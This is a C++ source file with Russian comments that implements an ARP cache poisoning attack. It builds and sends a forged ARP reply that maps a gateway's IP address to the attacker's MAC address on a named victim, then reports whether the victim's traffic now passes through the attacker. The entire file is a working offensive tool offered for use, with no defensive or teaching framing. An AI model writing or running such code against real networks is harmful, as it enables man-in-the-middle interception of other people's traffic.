#include <iostream>
#include <sstream>
#include <string.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <netpacket/packet.h> // Нужно для sockaddr_ll

#define BUFFER_SIZE 42 // Размер ARP-пакета

using namespace std;

// Функция для конвертации MAC-адреса из строки в массив байтов
void parse_mac(const string& mac_str, uint8_t* mac) {
    sscanf(mac_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

// Функция для конвертации IP-адреса из строки в массив байтов
void parse_ip(const string& ip_str, uint8_t* ip) {
    sscanf(ip_str.c_str(), "%hhu.%hhu.%hhu.%hhu", &ip[0], &ip[1], &ip[2], &ip[3]);
}

// Функция получения MAC-адреса интерфейса
void get_mac_address(const char* iface, uint8_t* mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
}

// Функция отправки ARP-ответа (спуфинг)
void send_arp_reply(int sock, struct sockaddr_ll* device, uint8_t* target_ip, uint8_t* target_mac, uint8_t* spoof_ip, uint8_t* my_mac) {
    uint8_t packet[BUFFER_SIZE];

    struct ether_header* eth = (struct ether_header*)packet;
    struct ether_arp* arp = (struct ether_arp*)(packet + sizeof(struct ether_header));

    // Заполняем Ethernet-заголовок
    memcpy(eth->ether_shost, my_mac, 6);
    memcpy(eth->ether_dhost, target_mac, 6);
    eth->ether_type = htons(ETH_P_ARP);

    // Заполняем ARP-запрос
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

    memcpy(arp->arp_sha, my_mac, 6);
    memcpy(arp->arp_spa, spoof_ip, 4);
    memcpy(arp->arp_tha, target_mac, 6);
    memcpy(arp->arp_tpa, target_ip, 4);

    // Отправляем пакет
    socklen_t addr_len = sizeof(struct sockaddr_ll);
    sendto(sock, packet, BUFFER_SIZE, 0, (struct sockaddr*)device, addr_len);
}

// Функция проверки успешности атаки
bool check_arp_poisoning(int sock, uint8_t* target_ip, uint8_t* my_mac) {
    uint8_t buffer[BUFFER_SIZE];
    struct ether_header* eth;
    struct ether_arp* arp;

    while (true) {
        recv(sock, buffer, BUFFER_SIZE, 0);
        eth = (struct ether_header*)buffer;
        arp = (struct ether_arp*)(buffer + sizeof(struct ether_header));

        if (ntohs(eth->ether_type) == ETH_P_ARP && ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY) {
            if (memcmp(arp->arp_sha, my_mac, 6) == 0) {
                cout << "[+] ARP Poisoning успешно выполнен!" << endl;
                return true;
            }
        }
    }
    return false;
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        cout << "Использование: " << argv[0] << " <интерфейс> <IP жертвы> <MAC жертвы> <IP шлюза>" << endl;
        return 1;
    }

    const char* iface = argv[1]; // Интерфейс атаки
    uint8_t my_mac[6];
    get_mac_address(iface, my_mac);

    uint8_t victim_ip[4], gateway_ip[4], victim_mac[6];
    parse_ip(argv[2], victim_ip);
    parse_mac(argv[3], victim_mac);
    parse_ip(argv[4], gateway_ip);

    // Создание сырого сокета
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Ошибка создания сокета");
        return 1;
    }

    struct sockaddr_ll device = {};
    device.sll_ifindex = if_nametoindex(iface);
    device.sll_halen = ETH_ALEN;
    memcpy(device.sll_addr, victim_mac, 6);

    cout << "[+] Отравление ARP-кэша жертвы..." << endl;
    send_arp_reply(sock, &device, victim_ip, victim_mac, gateway_ip, my_mac);
    sleep(2); // Подождем немного

    cout << "[+] Проверка успешности атаки..." << endl;
    if (check_arp_poisoning(sock, victim_ip, my_mac)) {
        cout << "[SUCCESS] Жертва перенаправляет трафик через атакующего!" << endl;
    } else {
        cout << "[FAIL] Атака не удалась!" << endl;
    }

    close(sock);
    return 0;
}
